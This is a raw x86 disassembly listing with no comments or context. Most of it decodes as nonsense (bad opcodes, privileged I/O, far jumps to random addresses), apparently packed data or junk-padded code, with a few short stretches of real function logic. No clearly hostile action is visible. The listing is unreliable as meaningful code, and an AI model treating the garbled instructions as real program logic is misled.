  413993:	shr    BYTE PTR [ebx-0x5b],cl
  413996:	js     0x413938
  413998:	cmc    
  413999:	adc    DWORD PTR [edx],eax
  41399b:	fnsave [edx-0x42c1d48b]
  4139a1:	fsubr  DWORD PTR [ebx+0x6e]
  4139a4:	push   ss
  4139a5:	ror    DWORD PTR [esi-0x6610a69e],cl
  4139ab:	nop
  4139ac:	mov    ecx,0x3d44e731
  4139b1:	xor    eax,0xcc1fd09e
  4139b6:	outs   dx,BYTE PTR fs:[esi]
  4139b8:	stc    
  4139b9:	es cdq 
  4139bb:	arpl   WORD PTR [ecx],bx
  4139bd:	sahf   
  4139be:	lahf   
  4139bf:	and    DWORD PTR [esi+0x321ceb16],0x12eff4bb
  4139c9:	scas   eax,DWORD PTR es:[edi]
  4139ca:	sbb    esi,DWORD PTR [eax+0x600303a]
  4139d0:	jmp    0x721e2321
  4139d5:	adc    BYTE PTR [ebx+0xd],0x21
  4139d9:	pop    ebp
  4139da:	ja     0x413982
  4139dc:	dec    eax
  4139dd:	call   0x1f57:0x21b6c60
  4139e4:	push   ds
  4139e5:	fadd   st(1),st
  4139e7:	sbb    ebp,edi
  4139e9:	cmp    ecx,esp
  4139eb:	mov    ?,WORD PTR [ecx]
  4139ed:	pop    es
  4139ee:	jmp    0x413997
  4139f0:	or     dh,BYTE PTR [ebx]
  4139f2:	cld    
  4139f3:	dec    ebx
  4139f4:	loop   0x413991
  4139f6:	leave  
  4139f7:	in     eax,dx
  4139f8:	out    0x58,al
  4139fa:	inc    ebx
  4139fb:	or     al,0xfa
  4139fd:	xchg   edi,eax
  4139fe:	sbb    DWORD PTR [edx-0xefaaae3],edi
  413a04:	daa    
  413a05:	sub    BYTE PTR [ebp+0x3e],0x53
  413a09:	in     al,0x77
  413a0b:	mov    al,ds:0xe2c71e8e
  413a10:	hlt    
  413a11:	lahf   
  413a12:	add    eax,0xd6af20af
  413a17:	push   edx
  413a18:	je     0x4139c4
  413a1a:	adc    BYTE PTR [edi-0x3f0accac],ah
  413a20:	call   0x427de67b
  413a25:	jge    0x4139fa
  413a27:	inc    ecx
  413a28:	fwait
  413a29:	aaa    
  413a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a2b:	(bad)  
  413a2c:	cld    
  413a2d:	jne    0x4139e4
  413a2f:	adc    DWORD PTR [eax+0x12],ebx
  413a32:	push   edx
  413a33:	mov    edi,0x42f06ae1
  413a38:	ror    DWORD PTR [edi+0x772bf3b],1
  413a3e:	or     ch,BYTE PTR [edi+0x1af0d23b]
  413a44:	dec    ecx
  413a45:	pop    ebp
  413a46:	xor    BYTE PTR [edx+0x74],0x83
  413a4a:	mov    esp,DWORD PTR [ecx-0x4d]
  413a4d:	sub    edx,ecx
  413a4f:	fidivr WORD PTR [edx+0x2b]
  413a52:	mov    edi,0x8e37fe39
  413a57:	push   ebx
  413a58:	adc    al,0xdb
  413a5a:	cdq    
  413a5b:	test   ebp,ebp
  413a5d:	mov    al,ds:0x79a40209
  413a62:	sbb    ch,BYTE PTR [ecx+esi*2-0xa]
  413a66:	aaa    
  413a67:	push   es
  413a68:	cmp    al,0x6e
  413a6a:	and    al,0xde
  413a6c:	cs es add eax,0x71ce2a98
  413a73:	jmp    0x413ab3
  413a75:	jge    0x413aaa
  413a77:	inc    esi
  413a78:	and    BYTE PTR [ebx+0x15e194b1],0xb7
  413a7f:	ins    BYTE PTR es:[edi],dx
  413a80:	dec    ebx
  413a81:	inc    ebp
  413a82:	js     0x413a41
  413a84:	jle    0x413a23
  413a86:	loopne 0x413a1e
  413a88:	cmp    eax,0xd764b4f4
  413a8d:	ds stos BYTE PTR es:[edi],al
  413a8f:	into   
  413a90:	sahf   
  413a91:	inc    esi
  413a92:	xor    BYTE PTR [ecx+0x7ffc3b7d],cl
  413a98:	sbb    eax,0x14e150a3
  413a9d:	fucomip st,st(2)
  413a9f:	add    esp,ecx
  413aa1:	rol    dh,0xae
  413aa4:	je     0x413aa6
  413aa6:	fs stos BYTE PTR es:[edi],al
  413aa8:	and    edx,edi
  413aaa:	retf   0x9a81
  413aad:	ror    BYTE PTR [ecx-0x54656fb2],1
  413ab3:	sub    esp,DWORD PTR [edi+eiz*4+0x41]
  413ab7:	es je  0x413ae9
  413aba:	push   ds
  413abb:	cmp    al,dh
  413abd:	or     al,0x71
  413abf:	aad    0x2d
  413ac1:	mov    ds:0x72b2dc01,al
  413ac6:	call   0x81a50ad6
  413acb:	cmp    eax,edx
  413acd:	ret    
  413ace:	xlat   BYTE PTR ds:[ebx]
  413acf:	ja     0x413aa1
  413ad1:	stos   BYTE PTR es:[edi],al
  413ad2:	pushf  
  413ad3:	bound  ecx,QWORD PTR [eax]
  413ad5:	xchg   esp,eax
  413ad6:	and    al,0x32
  413ad8:	mov    ebx,eax
  413ada:	add    BYTE PTR [eax-0x382cff2d],dl
  413ae0:	mov    ebp,ebx
  413ae2:	out    0x1d,al
  413ae4:	icebp  
  413ae5:	mov    edx,0x645e4754
  413aea:	jno    0x413b3a
  413aec:	lods   eax,DWORD PTR ds:[esi]
  413aed:	outs   dx,BYTE PTR ds:[esi]
  413aee:	in     eax,0x6e
  413af0:	sub    BYTE PTR [ebp+0x55348df7],cl
  413af6:	pushf  
  413af7:	cmp    bl,BYTE PTR [ebx+0x6d594904]
  413afd:	cli    
  413afe:	mov    ch,dl
  413b00:	mov    esi,0x2a03820
  413b05:	jp     0x413aa4
  413b07:	pop    ss
  413b08:	imul   ebx,eax,0xffffffa2
  413b0b:	test   eax,0x69dffaf7
  413b10:	inc    ecx
  413b11:	lods   eax,DWORD PTR ds:[esi]
  413b12:	arpl   WORD PTR [edi+0x50],di
  413b15:	adc    BYTE PTR [edx-0x16],bh
  413b18:	inc    edx
  413b19:	call   0xe6fa:0xe234920f
  413b20:	adc    bl,BYTE PTR [ebx+0x17c135ab]
  413b26:	xchg   ebp,eax
  413b27:	outs   dx,BYTE PTR ds:[esi]
  413b28:	xlat   BYTE PTR ds:[ebx]
  413b29:	xchg   ecx,eax
  413b2a:	or     al,0x62
  413b2c:	mov    edi,0xe20ca3c3
  413b31:	xchg   esp,eax
  413b32:	mov    es,WORD PTR [ecx]
  413b34:	inc    edx
  413b35:	xchg   ecx,eax
  413b36:	xchg   DWORD PTR [esi+edx*4+0x7df5f752],esi
  413b3d:	mov    ds:0x227f19d5,eax
  413b42:	test   al,0x97
  413b44:	dec    edx
  413b45:	fadd   QWORD PTR [eax-0x62a383d7]
  413b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4c:	stos   BYTE PTR es:[edi],al
  413b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b4e:	mov    eax,ds:0xc00af077
  413b53:	cmp    al,0x52
  413b55:	jns    0x413b47
  413b57:	dec    esp
  413b58:	fisub  DWORD PTR [edx-0x65e15987]
  413b5e:	mov    ebp,0xf56ce782
  413b63:	nop
  413b64:	test   eax,0xef04cd6f
  413b69:	stos   DWORD PTR es:[edi],eax
  413b6a:	out    dx,al
  413b6b:	dec    esp
  413b6c:	mov    al,0xa6
  413b6e:	sbb    esp,esi
  413b70:	pop    ebp
  413b71:	cwde   
  413b72:	enter  0xd5d9,0xad
  413b76:	mov    cl,0x1e
  413b78:	push   cs
  413b79:	sti    
  413b7a:	xor    DWORD PTR [esp+ecx*2-0x28c8e7a0],edx
  413b81:	mov    ah,0x3a
  413b83:	fsub   st,st(7)
  413b85:	xchg   esi,eax
  413b86:	mov    ebp,0xb7f6b152
  413b8b:	lds    ebp,FWORD PTR [edx-0x6e]
  413b8e:	dec    esp
  413b8f:	jecxz  0x413b23
  413b91:	cmp    BYTE PTR [ebx-0x59b07fb6],dl
  413b97:	lea    ecx,[esi+ecx*4+0x78ffd4a8]
  413b9e:	mov    ebx,0x1fc69813
  413ba3:	inc    edx
  413ba4:	test   DWORD PTR ds:0x58c51014,edi
  413baa:	sub    eax,0x9afd410e
  413baf:	jbe    0x413b57
  413bb1:	test   esi,0xb048bd2b
  413bb7:	cwde   
  413bb8:	dec    esp
  413bb9:	push   ecx
  413bba:	popa   
  413bbb:	fidiv  DWORD PTR [esi]
  413bbd:	daa    
  413bbe:	mov    eax,0xad2bbe47
  413bc3:	and    DWORD PTR ds:0xa0fbd231,ecx
  413bc9:	adc    al,0xc9
  413bcb:	sub    edi,DWORD PTR [ebx]
  413bcd:	or     BYTE PTR [edi-0x9],ch
  413bd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd1:	popa   
  413bd2:	cmp    eax,0xfd6f0d16
  413bd7:	mov    eax,0x49cdfc76
  413bdc:	pop    edx
  413bdd:	fnstenv [edx+eax*8+0x3]
  413be1:	inc    ebx
  413be2:	sub    eax,0xde42f3a1
  413be7:	ror    BYTE PTR [esi-0x3d3ef3c4],0x81
  413bee:	mov    dh,0xe7
  413bf0:	push   edx
  413bf1:	cwde   
  413bf2:	cmp    ebp,DWORD PTR [ebp-0x47d77823]
  413bf8:	clc    
  413bf9:	dec    ebp
  413bfa:	in     eax,dx
  413bfb:	(bad)  
  413bfc:	inc    edx
  413bfd:	mov    es,WORD PTR [ebp+0x64]
  413c00:	into   
  413c01:	bound  ecx,QWORD PTR [eax+0x4d715a2c]
  413c07:	mov    al,ds:0x3d595d2f
  413c0c:	in     eax,dx
  413c0d:	xor    al,0x4b
  413c0f:	nop
  413c10:	shl    bh,1
  413c12:	fdiv   DWORD PTR [ebx+0x79]
  413c15:	das    
  413c16:	loop   0x413bb7
  413c18:	jle    0x413c78
  413c1a:	mov    ss,WORD PTR [esi]
  413c1c:	outs   dx,DWORD PTR ds:[esi]
  413c1d:	fstp   DWORD PTR [ecx+0x41]
  413c20:	sbb    al,BYTE PTR [eax+0x6e]
  413c23:	imul   BYTE PTR [esi-0x19]
  413c26:	fdivr  QWORD PTR [ecx+0x6ac61957]
  413c2c:	imul   ebp,DWORD PTR [edi+edi*2+0x4983cfa1],0x6af8a813
  413c37:	sahf   
  413c38:	mov    BYTE PTR [eax],0x6
  413c3b:	stos   BYTE PTR es:[edi],al
  413c3c:	int    0x4d
  413c3e:	dec    edx
  413c3f:	sub    BYTE PTR [ecx-0x778e45aa],dl
  413c45:	cmp    al,al
  413c47:	icebp  
  413c48:	dec    esi
  413c49:	mov    ebp,0xfdd0cedf
  413c4e:	lods   eax,DWORD PTR ds:[esi]
  413c4f:	pop    esi
  413c50:	jg     0x413c5a
  413c52:	shl    ecx,1
  413c54:	inc    esp
  413c55:	mov    cl,0x92
  413c57:	add    ah,BYTE PTR [ecx]
  413c59:	ret    
  413c5a:	popf   
  413c5b:	adc    eax,0xcaefb57a
  413c60:	or     eax,0x26c3afa7
  413c65:	callw  0xcc0f
  413c69:	mov    edi,0x23854d03
  413c6e:	push   ebx
  413c6f:	jle    0x413c62
  413c71:	jmp    0x28ed:0xa0a6539b
  413c78:	mov    eax,0xe4cbc10f
  413c7d:	retf   0x5167
  413c80:	inc    DWORD PTR [edx-0xba53457]
  413c86:	fptan  
  413c88:	fldenv [ecx-0x3d]
  413c8b:	inc    esi
  413c8c:	and    eax,edx
  413c8e:	rcr    edx,1
  413c90:	push   cs
  413c91:	sub    bl,BYTE PTR [ebx+0x43]
  413c94:	xchg   esp,eax
  413c95:	fstp   DWORD PTR [esi+0x3f1b6a96]
  413c9b:	ins    DWORD PTR es:[edi],dx
  413c9c:	cmp    dh,BYTE PTR [eax-0x61]
  413c9f:	add    al,0xe
  413ca1:	leave  
  413ca2:	call   0x39a13711
  413ca7:	mov    DWORD PTR [ebp-0x5d],0x8b10039c
  413cae:	dec    ebp
  413caf:	fcom   DWORD PTR [ebx]
  413cb1:	pop    eax
  413cb2:	add    al,0x6a
  413cb4:	add    dh,BYTE PTR [ebx]
  413cb6:	fimul  WORD PTR [ebx+0x2b5edc75]
  413cbc:	icebp  
  413cbd:	mov    ecx,DWORD PTR [ebp-0x30]
  413cc0:	sub    esi,ecx
  413cc2:	mov    eax,ebx
  413cc4:	mov    ebx,DWORD PTR [ebp-0x2c]
  413cc7:	mov    ecx,DWORD PTR [ebp+0xc]
  413cca:	add    esi,DWORD PTR [ecx]
  413ccc:	xor    edx,0xca79a577
  413cd2:	shrd   edx,eax,0x2
  413cd6:	xor    ecx,ecx
  413cd8:	shl    esi,0x1e
  413cdb:	xor    ecx,edi
  413cdd:	shr    eax,0x2
  413ce0:	or     ecx,edx
  413ce2:	xor    esi,0x40000000
  413ce8:	or     esi,eax
  413cea:	mov    DWORD PTR [ebp-0x40],ecx
  413ced:	jmp    0x4140c5
  413cf2:	mov    ebx,0xbaf9bbd6
  413cf7:	fcomp  QWORD PTR [edx-0x1ad0e566]
  413cfd:	stos   BYTE PTR es:[edi],al
  413cfe:	addr16 out dx,eax
  413d00:	sub    eax,0x183289be
  413d05:	sbb    BYTE PTR [edx-0x77e7e7ee],ch
  413d0b:	and    BYTE PTR [eax-0xa],0xb
  413d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d10:	xchg   edi,eax
  413d11:	mov    edx,DWORD PTR [edi-0x55a3523d]
  413d17:	dec    esi
  413d18:	push   edx
  413d19:	push   ds
  413d1a:	iret   
  413d1b:	adc    bl,BYTE PTR [edi+0x31]
  413d1e:	loope  0x413cf4
  413d20:	and    bl,BYTE PTR [ecx+0x7d6e0897]
  413d26:	xchg   esp,eax
  413d27:	dec    ebx
  413d28:	(bad)  
  413d29:	xor    BYTE PTR [eax-0xe],cl
  413d2c:	sbb    eax,DWORD PTR [eax]
  413d2e:	xchg   ebx,eax
  413d2f:	xchg   ecx,eax
  413d30:	das    
  413d31:	lock jne 0x413d51
  413d34:	mov    esi,0x401b0eb9
  413d39:	dec    eax
  413d3a:	iret   
  413d3b:	js     0x413cc2
  413d3d:	mov    ds:0xc849f1bf,al
  413d42:	in     eax,0xf7
  413d44:	mov    ah,0x5b
  413d46:	jge    0x413d07
  413d48:	or     BYTE PTR [ebp-0x27f6c3e5],0x4d
  413d4f:	adc    dl,BYTE PTR [eax+0x2]
  413d52:	int3   
  413d53:	icebp  
  413d54:	aam    0x74
  413d56:	mov    esi,0x67a3842c
  413d5b:	jl     0x413d51
  413d5d:	jle    0x413db7
  413d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d60:	cmp    DWORD PTR [ebp+0x3c],ecx
  413d63:	fild   DWORD PTR [esi-0x58]
  413d66:	pop    edx
  413d67:	push   ebp
  413d68:	xor    eax,0xb452f40e
  413d6d:	imul   eax,DWORD PTR [edx],0x9c812e92
  413d73:	leave  
  413d74:	lahf   
  413d75:	push   ebp
  413d76:	sub    DWORD PTR [esi],0xffffffdf
  413d79:	sar    DWORD PTR [edi+0x8],1
  413d7c:	push   cs
  413d7d:	mov    al,ds:0xda36fca
  413d82:	mov    ebx,DWORD PTR [esi-0x2d]
  413d85:	(bad)  
  413d86:	jl     0x413d65
  413d88:	mov    esi,ecx
  413d8a:	ins    BYTE PTR es:[edi],dx
  413d8b:	not    BYTE PTR [eax+0x4e]
  413d8e:	push   es
  413d8f:	or     edi,edx
  413d91:	xchg   BYTE PTR [ecx+0x3b],cl
  413d94:	mov    al,ds:0x6e369fad
  413d99:	mov    cl,0x86
  413d9b:	push   cs
  413d9c:	hlt    
  413d9d:	mov    ss,edx
  413d9f:	and    ecx,DWORD PTR [edi]
  413da1:	sbb    DWORD PTR [edi+0x49],0x25e70d8f
  413da8:	mov    eax,0x2fb8ad6e
  413dad:	mov    gs,WORD PTR [ebx-0x3704baf4]
  413db3:	shr    ebx,cl
  413db5:	inc    ebx
  413db6:	(bad)  
  413db7:	gs pop ebp
  413db9:	icebp  
  413dba:	sub    eax,0xbc79a38e
  413dbf:	fstp   TBYTE PTR [eax]
  413dc1:	or     eax,DWORD PTR [ecx-0x3ba094f1]
  413dc7:	iret   
  413dc8:	xchg   esi,eax
  413dc9:	cs and dl,ah
  413dcc:	js     0x413d5a
  413dce:	scas   eax,DWORD PTR es:[edi]
  413dcf:	xor    eax,0x86d2733
  413dd4:	shr    bh,cl
  413dd6:	sub    eax,0x603d8ecd
  413ddb:	adc    BYTE PTR [esi+0x4d],cl
  413dde:	das    
  413ddf:	sub    BYTE PTR [eax-0x65],0x5f
  413de3:	mov    ds:0x24b8e512,eax
  413de8:	rol    DWORD PTR [ecx-0x742f4db6],0x6
  413def:	fnstsw WORD PTR [ebx]
  413df1:	adc    ebp,DWORD PTR [ebx]
  413df3:	scas   al,BYTE PTR es:[edi]
  413df4:	push   edi
  413df5:	mul    ebx
  413df7:	mov    edx,0x7516938e
  413dfc:	mov    WORD PTR [ebp-0x78237639],es
  413e02:	loop   0x413dc5
  413e04:	fwait
  413e05:	push   cs
  413e06:	iret   
  413e07:	inc    esi
  413e08:	xlat   BYTE PTR ds:[ebx]
  413e09:	sub    BYTE PTR ds:[ecx-0x29],0xff
  413e0e:	push   ss
  413e0f:	cwde   
  413e10:	and    DWORD PTR [edi+0x1b5652a],esp
  413e16:	sbb    al,ch
  413e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e19:	mov    bh,0x23
  413e1b:	push   ebx
  413e1c:	arpl   WORD PTR [eax-0x21],si
  413e1f:	mov    BYTE PTR [eax],al
  413e21:	or     DWORD PTR [edi-0xc6f162d],ebx
  413e27:	test   al,0xdd
  413e29:	or     al,0xe1
  413e2b:	es push eax
  413e2d:	push   edx
  413e2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e2f:	mov    dh,0xfb
  413e31:	test   BYTE PTR [ebx-0x3576bfa4],ah
  413e37:	mov    ecx,0x8e8af384
  413e3c:	xor    bl,BYTE PTR [edx]
  413e3e:	jne    0x413e03
  413e40:	popa   
  413e41:	nop
  413e42:	lock inc esp
  413e44:	cmp    DWORD PTR [ecx-0x26],edx
  413e47:	xor    eax,0xa78f45f9
  413e4c:	nop
  413e4d:	lock ins BYTE PTR es:[edi],dx
  413e4f:	and    eax,ebp
  413e51:	adc    eax,0xc1f7d2e7
  413e56:	add    eax,0xc71f662f
  413e5b:	adc    edi,DWORD PTR [ebx-0x18]
  413e5e:	push   ebp
  413e5f:	stos   DWORD PTR es:[edi],eax
  413e60:	jl     0x413ea5
  413e62:	add    esp,eax
  413e64:	pop    ebp
  413e65:	xor    al,0xe4
  413e67:	fnstenv [ebp-0xca29f73]
  413e6d:	fwait
  413e6e:	retf   0xbb1a
  413e71:	loop   0x413df5
  413e73:	lea    esp,fs:[ecx+edi*4]
  413e77:	push   ds
  413e78:	add    eax,0x7368964d
  413e7d:	cwde   
  413e7e:	sub    cl,dl
  413e80:	out    dx,eax
  413e81:	stc    
  413e82:	mov    BYTE PTR [esi-0x5cd131bd],bl
  413e88:	jbe    0x413e11
  413e8a:	lods   al,BYTE PTR ds:[esi]
  413e8b:	mov    ah,0xc4
  413e8d:	test   eax,esi
  413e8f:	mov    esp,0x9c69a4a2
  413e94:	and    bl,BYTE PTR [ecx]
  413e96:	push   esi
  413e97:	jno    0x413ef9
  413e99:	sbb    al,0x90
  413e9b:	aaa    
  413e9c:	ja     0x413ee1
  413e9e:	xor    dl,ch
  413ea0:	in     al,0x26
  413ea2:	adc    DWORD PTR [eax+edi*8],edi
  413ea5:	mov    ?,WORD PTR [ebp+0x3e64259d]
  413eab:	fimul  WORD PTR [edi-0x3eefde23]
  413eb1:	xor    ch,ah
  413eb3:	add    dl,al
  413eb5:	mov    ch,0x85
  413eb7:	adc    edx,DWORD PTR [edi-0x2318522c]
  413ebd:	dec    ebp
  413ebe:	scas   eax,DWORD PTR es:[edi]
  413ebf:	xlat   BYTE PTR ds:[ebx]
  413ec0:	das    
  413ec1:	adc    eax,0xe7663e27
  413ec6:	fdivr  DWORD PTR [ecx]
  413ec8:	push   edi
  413ec9:	inc    edx
  413eca:	mov    ds:0x34d4c868,al
  413ecf:	int    0xf
  413ed1:	adc    BYTE PTR [eax+0x1e],0x4
  413ed5:	cld    
  413ed6:	push   ebp
  413ed7:	call   0x4d6f:0xb7060134
  413ede:	cdq    
  413edf:	xchg   ebx,eax
  413ee0:	call   0xf735:0x12f30e42
  413ee7:	inc    ecx
  413ee8:	pop    ebx
  413ee9:	stc    
  413eea:	sahf   
  413eeb:	in     al,0x5d
  413eed:	sub    dl,dl
  413eef:	(bad)  [ebx+edx*4+0x6a]
  413ef3:	or     DWORD PTR [edi],esp
  413ef5:	mov    cl,0xd0
  413ef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ef9:	cmp    esi,DWORD PTR [ebx-0x7490a717]
  413eff:	shl    DWORD PTR [edx],cl
  413f01:	inc    edx
  413f02:	jle    0x413ecd
  413f04:	iret   
  413f05:	fcomp  QWORD PTR [eax+esi*8-0x79]
  413f09:	push   DWORD PTR [edi]
  413f0b:	sub    eax,0xa479fc19
  413f10:	jo     0x413ee2
  413f12:	enter  0x7b58,0x73
  413f16:	mov    edx,0xe2d41935
  413f1b:	xchg   esi,eax
  413f1c:	jae    0x413f9d
  413f1e:	cmc    
  413f1f:	xchg   ebp,eax
  413f20:	scas   eax,DWORD PTR es:[edi]
  413f21:	and    eax,0x45138fb1
  413f26:	nop
  413f27:	or     eax,0x7703f915
  413f2c:	fs js  0x413f49
  413f2f:	cmp    eax,0x9dc105d5
  413f34:	push   ebp
  413f35:	mov    ds:0xb74f240f,al
  413f3a:	inc    ebp
  413f3b:	xchg   esp,eax
  413f3c:	add    DWORD PTR [ebx-0x4b],eax
  413f3f:	shl    BYTE PTR [ebx+ebx*1],0x17
  413f43:	iret   
  413f44:	jp     0x413faf
  413f46:	inc    edi
  413f47:	jae    0x413f0f
  413f49:	pop    edi
  413f4a:	and    al,0xfb
  413f4c:	test   ah,dh
  413f4e:	sub    al,0x9e
  413f50:	lods   al,BYTE PTR ds:[esi]
  413f51:	xchg   ebp,eax
  413f52:	and    DWORD PTR [ebp-0x5b],eax
  413f55:	jno    0x413f02
  413f57:	inc    edi
  413f58:	mov    ecx,0x4d544be3
  413f5d:	cmp    ah,BYTE PTR ds:0x8c6ff70f
  413f63:	loopne 0x413f8d
  413f65:	sbb    DWORD PTR [ecx+ebp*8+0x36],ecx
  413f69:	out    0xd9,eax
  413f6b:	pop    esp
  413f6c:	enter  0xe747,0x97
  413f70:	out    dx,al
  413f71:	neg    DWORD PTR [esi+0x5]
  413f74:	mov    esp,0xc1fe935c
  413f79:	out    dx,al
  413f7a:	and    bh,BYTE PTR [edi+0xf]
  413f7d:	leave  
  413f7e:	scas   al,BYTE PTR es:[edi]
  413f7f:	icebp  
  413f80:	nop
  413f81:	mov    ds:0x7221aee5,al
  413f86:	mov    dl,0x30
  413f88:	outs   dx,DWORD PTR ds:[esi]
  413f89:	mov    ebx,?
  413f8b:	push   esp
  413f8c:	adc    eax,0xa7301efc
  413f91:	inc    esi
  413f92:	mov    ds:0x9fd50a78,al
  413f97:	pop    es
  413f98:	push   edi
  413f99:	jge    0x413f98
  413f9b:	fldcw  WORD PTR [edx+edi*8]
  413f9e:	push   es
  413f9f:	rcl    bh,0x9c
  413fa2:	xor    al,0x9d
  413fa4:	lods   eax,DWORD PTR ds:[esi]
  413fa5:	jp     0x413fbe
  413fa7:	nop
  413fa8:	cmp    dl,BYTE PTR [eax-0xe]
  413fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fac:	jns    0x413fbe
  413fae:	out    0x7,eax
  413fb0:	push   edx
  413fb1:	dec    ebp
  413fb2:	inc    ecx
  413fb3:	lods   al,BYTE PTR ds:[esi]
  413fb4:	pusha  
  413fb5:	adc    BYTE PTR ds:0xa016a3aa,ch
  413fbb:	dec    ebx
  413fbc:	(bad)  
  413fbd:	les    esp,FWORD PTR [ecx+edx*4]
  413fc0:	fisubr WORD PTR cs:[edx]
  413fc3:	loop   0x414038
  413fc5:	pop    ebx
  413fc6:	inc    ebp
  413fc7:	nop
  413fc8:	sub    edx,esp
  413fca:	test   DWORD PTR [edx+0x2472738e],esi
  413fd0:	xor    al,0x21
  413fd2:	bound  esp,QWORD PTR [ebx+eiz*1]
  413fd5:	out    0x3f,eax
  413fd7:	add    BYTE PTR [ecx+0xb],bl
  413fda:	add    al,0xca
  413fdc:	scas   al,BYTE PTR es:[edi]
  413fdd:	pop    ebx
  413fde:	cli    
  413fdf:	push   es
  413fe0:	shl    esp,1
  413fe2:	sbb    al,0xd4
  413fe4:	sar    BYTE PTR [ecx],1
  413fe6:	jo     0x414038
  413fe8:	fsub   DWORD PTR [edi+0x4c]
  413feb:	fidiv  WORD PTR ds:0x2bcefceb
  413ff1:	fist   DWORD PTR [ebx]
  413ff3:	pop    edx
  413ff4:	inc    edi
  413ff5:	mov    eax,ds:0x2c25ff12
  413ffa:	mov    al,ds:0xf448298f
  413fff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414000:	das    
  414001:	sub    edx,DWORD PTR [ebp+0x31]
  414004:	adc    edx,DWORD PTR cs:[ecx+0x36]
  414008:	jg     0x414013
  41400a:	mov    dl,0x5
  41400c:	sub    ch,BYTE PTR [eax]
  41400e:	daa    
  41400f:	mov    ebp,0x23006d06
  414014:	mov    ds:0xbeee25d9,eax
  414019:	inc    esp
  41401a:	sub    BYTE PTR [esi-0x4d],ah
  41401d:	pop    ss
  41401e:	addr16 dec edx
  414020:	imul   eax,DWORD PTR [ecx+0x24],0xf85beb58
  414027:	lods   eax,DWORD PTR ds:[esi]
  414028:	sbb    esp,DWORD PTR [edx+0x38]
  41402b:	and    al,0xb0
  41402d:	xchg   DWORD PTR [eax],ebp
  41402f:	sbb    BYTE PTR ds:0xd59812a4,al
  414035:	mov    cl,0xea
  414037:	addr16 hlt 
  414039:	sbb    esp,DWORD PTR [ebx+0x63e159b2]
  41403f:	sub    eax,0xe3cd3f43
  414044:	sbb    BYTE PTR ds:0x482e2049,dh
  41404a:	xchg   edi,eax
  41404b:	in     al,0x74
  41404d:	pop    ecx
  41404e:	ret    0xec0a
  414051:	sub    eax,0x494b1d64
  414056:	mov    eax,ds:0xcba68635
  41405b:	jne    0x413ff5
  41405d:	adc    bl,BYTE PTR [ebx]
  41405f:	mov    BYTE PTR [ebp+0x6991d3b6],al
  414065:	pop    esp
  414066:	lods   al,BYTE PTR ds:[esi]
  414067:	add    eax,0x73cd1051
  41406c:	jae    0x414071
  41406e:	call   0x715a2a62
  414073:	loope  0x414004
  414075:	(bad)  
  414076:	lock sbb al,0x32
  414079:	lock mov ds:0xa04e95e9,eax
  41407f:	mov    esp,DWORD PTR [ebx]
  414081:	dec    eax
  414082:	jmp    0x20:0xa32045d2
  414089:	and    eax,0xc9353662
  41408e:	and    BYTE PTR [ebx],cl
  414090:	jmp    0xcea90bb9
  414095:	(bad)  
  414096:	in     eax,dx
  414097:	int3   
  414098:	xchg   edi,esi
  41409a:	repnz or DWORD PTR [eax-0x6d],0x89d61ba3
  4140a2:	stos   BYTE PTR es:[edi],al
  4140a3:	cmp    DWORD PTR [edi+0x4d153bf],esi
  4140a9:	mov    ds:0xd44a569c,al
  4140ae:	and    al,0xa3
  4140b0:	or     bl,0x7a
  4140b3:	lds    ecx,FWORD PTR [ebx+0x2609b7fa]
  4140b9:	das    
  4140ba:	mov    edi,0x2fb53e2c
  4140bf:	mov    ds:0xcf24f9a9,al
  4140c4:	xchg   ebp,eax
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x42206f
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebp+ecx*4+0xd]
  414159:	or     al,0x7e
  41415b:	sbb    ch,BYTE PTR [eax+ebx*1]
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [esi-0x44061ef5],ch
  414168:	aaa    
  414169:	leave  
  41416a:	or     DWORD PTR [edi],edi
  41416c:	mov    bl,0x8b
